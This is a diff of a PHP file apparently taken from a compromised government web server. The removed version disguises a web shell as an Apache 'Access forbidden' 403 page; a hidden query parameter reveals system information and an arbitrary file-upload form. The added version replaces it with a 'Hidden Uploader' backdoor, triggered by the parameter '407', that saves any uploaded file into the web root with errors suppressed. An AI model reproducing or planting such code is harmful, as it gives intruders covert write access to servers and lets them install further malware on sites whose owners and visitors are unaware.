@@ -1,28 +1,42 @@
-<?php if(isset($_GET["xero"])) { echo"<font color=#000>".php_uname().""; print "\n";$disable_functions = @ini_get("disable_functions"); echo "<br>DisablePHP=".$disable_functions; print "\n"; echo"<br><form method=post enctype=multipart/form-data>"; echo"<input type=file name=f><input name=k type=submit id=k value=upload><br>"; if($_POST["k"]==upload) { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>".$_FILES["f"]["name"]; }else{ echo"<b>Gagal upload"; } } } ?>
-<html>
+<?php 
+error_reporting(0);
+set_time_limit(0);
+@session_start();
+@set_time_limit(0);
+
+if(isset($_GET['407']))
+{
+	
+echo "
 <body>
-<h1>Access forbidden!</h1>
-<p>
+<font color=black size=3>";
+echo "<center><h1>Hidden Uploader</h1><br/><h2></h2></center><br/>";
+echo "<center><form action=\"\" method=\"post\" enctype=\"multipart/form-data\">
+<label for=\"file\">Filename:</label>
+<input type=\"file\" name=\"file\" id=\"file\"/>
+<br/><br/>
+<input type=\"submit\" name=\"submit\" value=\"UPLOAD\">
+</form></center>";
+if ($_FILES["file"]["error"] > 0)
+{
+echo "Error: " . $_FILES["file"]["error"] . "<br/>";
+}
+else
+{
+echo "Upload: " . $_FILES["file"]["name"] . "<br/>";
+echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br/>";
+echo "Stored in: " . $_FILES["file"]["tmp_name"];
+}
+if (file_exists("" . $_FILES["file"]["name"]))
+{
+echo $_FILES["file"]["name"] . " already exists. ";
+}
+else
+{
+move_uploaded_file($_FILES["file"]["tmp_name"],
+"" . $_FILES["file"]["name"]);
+echo "Stored in: " . "" . $_FILES["file"]["name"];
+}
+}
 
-
-  
-
-    You don't have permission to access the requested object.
-    It is either read-protected or not readable by the server.
-
-  
-
-</p>
-<p>
-If you think this is a server error, please contact
-the <a href="mailto:postmaster@localhost">webmaster</a>.
-
-</p>
-
-<h2>Error 403</h2>
-<address>
-  <a href="/">bpprd.bungokab.go.id</a><br />
-  <span>Apache/2.4.37 (Win32) OpenSSL/1.0.2p PHP/5.6.40</span>
-</address>
-</body>
-</html>
+?>
